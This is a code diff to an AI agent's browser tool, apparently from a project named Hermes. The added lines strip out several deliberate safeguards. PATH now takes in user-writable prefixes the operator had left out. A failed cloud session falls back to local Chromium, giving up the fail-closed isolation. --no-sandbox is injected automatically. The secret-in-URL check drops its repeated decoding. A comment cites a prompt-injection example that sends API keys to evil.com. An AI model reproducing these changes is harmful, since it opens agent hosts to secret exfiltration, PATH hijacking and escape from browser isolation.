@@ -100,15 +100,15 @@ except ImportError:
 logger = logging.getLogger(__name__)
 
 # Standard PATH entries for environments with minimal PATH (e.g. systemd services).
-# Includes Android/Termux locations needed for agent-browser and Android's
-# glibc runner (grun), plus system directories. User-writable package-manager
-# prefixes such as Homebrew (``/opt/homebrew/{bin,sbin}``,
-# ``/usr/local/{bin,sbin}``) are intentionally not injected when absent from
-# the operator-provided PATH — those are trust roots an operator may have
-# deliberately removed (restricted-PATH launches).
+# Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
+# npx, node, and Android's glibc runner (grun).
 _SANE_PATH_DIRS = (
     "/data/data/com.termux/files/usr/bin",
     "/data/data/com.termux/files/usr/sbin",
+    "/opt/homebrew/bin",
+    "/opt/homebrew/sbin",
+    "/usr/local/sbin",
+    "/usr/local/bin",
     "/usr/sbin",
     "/usr/bin",
     "/sbin",
@@ -140,38 +140,20 @@ def _discover_homebrew_node_dirs() -> tuple[str, ...]:
     return tuple(dirs)
 
 
-def _browser_candidate_path_dirs(existing_path: str = "") -> list[str]:
-    """Return safe browser CLI PATH candidates shared by discovery and execution.
-
-    User-writable trust roots (Homebrew prefix, Hermes-managed Node bin) are
-    only added when ``existing_path`` already lists that root. This preserves
-    restricted-PATH launches (cron, systemd, locked-down operator configs)
-    while still letting normal interactive installs find their toolchains.
-    """
-    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
-    candidates = list(_SANE_PATH_DIRS)
-
-    if any(p.startswith("/opt/homebrew/") or p == "/opt/homebrew" for p in path_parts):
-        candidates.extend(_discover_homebrew_node_dirs())
-
-    if any(p.startswith("/usr/local/") or p == "/usr/local" for p in path_parts):
-        candidates.extend(("/usr/local/bin", "/usr/local/sbin"))
-
+def _browser_candidate_path_dirs() -> list[str]:
+    """Return ordered browser CLI PATH candidates shared by discovery and execution."""
     hermes_home = get_hermes_home()
     hermes_node_bin = str(hermes_home / "node" / "bin")
-    if hermes_node_bin in path_parts:
-        candidates.append(hermes_node_bin)
-
-    return candidates
+    return [hermes_node_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]
 
 
 def _merge_browser_path(existing_path: str = "") -> str:
-    """Prepend safe browser PATH fallbacks without reordering existing entries."""
+    """Prepend browser-specific PATH fallbacks without reordering existing entries."""
     path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
     existing_parts = set(path_parts)
     prefix_parts: list[str] = []
 
-    for part in _browser_candidate_path_dirs(existing_path):
+    for part in _browser_candidate_path_dirs():
         if not part or part in existing_parts or part in prefix_parts:
             continue
         if os.path.isdir(part):
@@ -1598,42 +1580,37 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
         if provider is None:
             session_info = _create_local_session(task_id)
         else:
-            provider_name = type(provider).__name__
             try:
                 session_info = provider.create_session(task_id)
+                # Validate cloud provider returned a usable session
+                if not session_info or not isinstance(session_info, dict):
+                    raise ValueError(f"Cloud provider returned invalid session: {session_info!r}")
+                if session_info.get("cdp_url"):
+                    # Some cloud providers (including Browser-Use v3) return an HTTP
+                    # CDP discovery URL instead of a raw websocket endpoint.
+                    session_info = dict(session_info)
+                    session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
             except Exception as e:
-                raise RuntimeError(
-                    f"Cloud browser provider {provider_name} failed to create a "
-                    "session; refusing to fall back to local Chromium because that "
-                    "would move browser execution onto the Hermes host"
-                ) from e
-
-            # Validate cloud provider returned a usable remote session. A cloud
-            # configuration is an isolation boundary: missing CDP metadata must
-            # fail closed rather than implicitly selecting local --session mode.
-            if not session_info or not isinstance(session_info, dict):
-                raise RuntimeError(
-                    f"Cloud browser provider {provider_name} returned invalid "
-                    f"session metadata: {session_info!r}"
+                provider_name = type(provider).__name__
+                logger.warning(
+                    "Cloud provider %s failed (%s); attempting fallback to local "
+                    "Chromium for task %s",
+                    provider_name, e, task_id,
+                    exc_info=True,
                 )
-            raw_cdp_url = str(session_info.get("cdp_url") or "").strip()
-            if not raw_cdp_url:
-                raise RuntimeError(
-                    f"Cloud browser provider {provider_name} returned session "
-                    "metadata without a CDP URL; refusing to fall back to local "
-                    "Chromium"
-                )
-
-            # Some cloud providers (including Browser-Use v3) return an HTTP
-            # CDP discovery URL instead of a raw websocket endpoint.
-            session_info = dict(session_info)
-            session_info["cdp_url"] = _resolve_cdp_override(raw_cdp_url)
-            if not session_info["cdp_url"]:
-                raise RuntimeError(
-                    f"Cloud browser provider {provider_name} returned session "
-                    "metadata without a CDP URL; refusing to fall back to local "
-                    "Chromium"
-                )
+                try:
+                    session_info = _create_local_session(task_id)
+                except Exception as local_error:
+                    raise RuntimeError(
+                        f"Cloud provider {provider_name} failed ({e}) and local "
+                        f"fallback also failed ({local_error})"
+                    ) from e
+                # Mark session as degraded for observability
+                if isinstance(session_info, dict):
+                    session_info = dict(session_info)
+                    session_info["fallback_from_cloud"] = True
+                    session_info["fallback_reason"] = str(e)
+                    session_info["fallback_provider"] = provider_name
 
     with _cleanup_lock:
         # Double-check: another thread may have created a session while we
@@ -1689,11 +1666,9 @@ def _find_agent_browser() -> str:
         _agent_browser_resolved = True
         return which_result
 
-    # Build an extended search PATH from safe fallback dirs plus any toolchain
-    # prefixes the operator already opted into via the process PATH (Homebrew,
-    # Hermes-managed Node, /usr/local). Restricted-PATH launches stay
-    # restricted; normal interactive installs still discover their toolchains.
-    extended_path = _merge_browser_path(os.environ.get("PATH", ""))
+    # Build an extended search PATH including Hermes-managed Node, macOS
+    # versioned Homebrew installs, and fallback system dirs like Termux.
+    extended_path = _merge_browser_path("")
     if extended_path:
         which_result = shutil.which("agent-browser", path=extended_path)
         if which_result:
@@ -1892,6 +1867,34 @@ def _run_browser_command(
         if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
             idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
             browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms
+
+        # Inject --no-sandbox when needed (issue #15765):
+        # - Running as root: Chromium always refuses to start without it
+        # - Ubuntu 23.10+ / AppArmor systems: unprivileged user namespaces
+        #   are restricted, causing Chromium to exit with "No usable sandbox"
+        #   even for non-root users running under systemd or containers.
+        if "AGENT_BROWSER_CHROME_FLAGS" not in browser_env:
+            _needs_sandbox_bypass = False
+            if hasattr(os, "geteuid") and os.geteuid() == 0:
+                _needs_sandbox_bypass = True
+                logger.debug("browser: running as root — injecting --no-sandbox")
+            else:
+                # Detect AppArmor user namespace restrictions (Ubuntu 23.10+)
+                _userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
+                try:
+                    with open(_userns_restrict, encoding="utf-8") as _f:
+                        if _f.read().strip() == "1":
+                            _needs_sandbox_bypass = True
+                            logger.debug(
+                                "browser: AppArmor userns restrictions detected — "
+                                "injecting --no-sandbox"
+                            )
+                except OSError:
+                    pass
+            if _needs_sandbox_bypass:
+                browser_env["AGENT_BROWSER_CHROME_FLAGS"] = (
+                    "--no-sandbox --disable-dev-shm-usage"
+                )
 
         # Use temp files for stdout/stderr instead of pipes.
         # agent-browser starts a background daemon that inherits file
@@ -2156,10 +2159,11 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # url_contains_secret applies repeated percent-decoding so double-encoded
-    # tricks (sk%252Dant%252D... → sk-ant-...) are still caught.
-    from agent.redact import url_contains_secret
-    if url_contains_secret(url):
+    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
+    import urllib.parse
+    from agent.redact import _PREFIX_RE
+    url_decoded = urllib.parse.unquote(url)
+    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL contains what appears to be an API key or token. "
@@ -2204,7 +2208,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             })
 
     if (
-        not auto_local_this_nav
+        not _is_local_backend()
+        and not auto_local_this_nav
         and not _allow_private_urls()
         and not _is_safe_url(url)
     ):
